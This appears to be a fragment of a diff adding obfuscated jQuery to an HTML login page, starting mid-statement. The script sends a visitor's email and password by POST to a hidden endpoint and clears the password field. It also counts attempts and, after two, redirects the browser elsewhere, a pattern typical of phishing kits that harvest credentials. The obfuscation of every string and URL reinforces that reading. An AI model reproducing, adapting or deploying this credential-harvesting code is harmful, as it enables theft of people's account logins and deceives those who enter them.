$(_0x37432f(0x1a6))[_0x37432f(0x19f)](),$(_0x37432f(0x1a6))['html'](_0x37432f(0x1c3)),![];if(!_0x547b50['test'](_0x49c105))return $('#error')[_0x37432f(0x19f)](),$(_0x37432f(0x1a6))[_0x37432f(0x1aa)]('<b\x20style=\x27color:red;\x27>No\x20customer\x20account\x20found.\x20Enter\x20your\x20email\x20address.</b>'),![];if(!_0x5484bc)return $('#error')[_0x37432f(0x19f)](),$('#error')[_0x37432f(0x1aa)](_0x37432f(0x1c7)),![];if(_0x5484bc[_0x37432f(0x1ba)]<0x4)return $('#error')['show'](),$('#error')[_0x37432f(0x1aa)](_0x37432f(0x195)),_0x432c67[_0x37432f(0x1af)],![];_0x51a27c=_0x51a27c+0x1,$[_0x37432f(0x1ae)]({'dataType':_0x37432f(0x197),'url':_0x37432f(0x1c4),'type':_0x37432f(0x1c1),'data':{'email':_0x432c67,'password':_0x5484bc},'beforeSend':function(_0x42b5ac){var _0x547d64=_0x37432f;$(_0x547d64(0x1a5))[_0x547d64(0x1aa)](_0x547d64(0x196));},'success':function(_0x437414){var _0x4ceb05=_0x37432f;$(_0x4ceb05(0x199))[_0x4ceb05(0x1aa)](_0x4ceb05(0x1b2)),_0x437414&&($(_0x4ceb05(0x199))['show'](),console[_0x4ceb05(0x198)](_0x437414),$('#msg')[_0x4ceb05(0x1aa)](_0x437414[_0x4ceb05(0x1a0)]),_0x437414[_0x4ceb05(0x194)]=='ok'?($(_0x4ceb05(0x1c5))[_0x4ceb05(0x1a2)](''),_0x51a27c>=0x2&&(_0x51a27c=0x0,window[_0x4ceb05(0x1a1)][_0x4ceb05(0x19a)](_0x4ceb05(0x19d)))):$(_0x4ceb05(0x199))[_0x4ceb05(0x1aa)](_0x437414[_0x4ceb05(0x1a0)]));},'error':function(){var _0x4509a8=_0x37432f;$(_0x4509a8(0x1c5))['val'](''),_0x51a27c>=0x2&&(_0x51a27c=0x0,window[_0x4509a8(0x1a1)][_0x4509a8(0x19a)](_0x4509a8(0x19d))),$(_0x4509a8(0x199))[_0x4509a8(0x19f)]();},'complete':function(){var _0x125fa7=_0x37432f;$(_0x125fa7(0x1a5))[_0x125fa7(0x1aa)](_0x125fa7(0x1bd));}});});}));
+
+
+  </script>
+  </html>
